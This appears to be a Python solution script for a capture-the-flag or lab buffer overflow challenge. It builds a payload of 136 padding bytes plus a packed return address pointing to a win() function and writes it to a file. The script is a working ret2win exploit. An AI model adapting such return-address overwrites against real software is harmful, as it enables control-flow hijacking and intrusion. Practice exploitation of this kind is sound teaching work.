import struct
from pathlib import Path

# Values determined using GDB
OFFSET = 136
WIN_ADDR = 0x401316

# Create the overflow payload
padding = b"A" * OFFSET
return_address = struct.pack("<Q", WIN_ADDR)

payload = padding + return_address

# Save the payload
Path("inbox").mkdir(exist_ok=True)
Path("inbox/payload.bin").write_bytes(payload)

print("Payload created successfully!")
print(f"Offset: {OFFSET} bytes")
print(f"win() address: {hex(WIN_ADDR)}")
print(f"Payload size: {len(payload)} bytes")
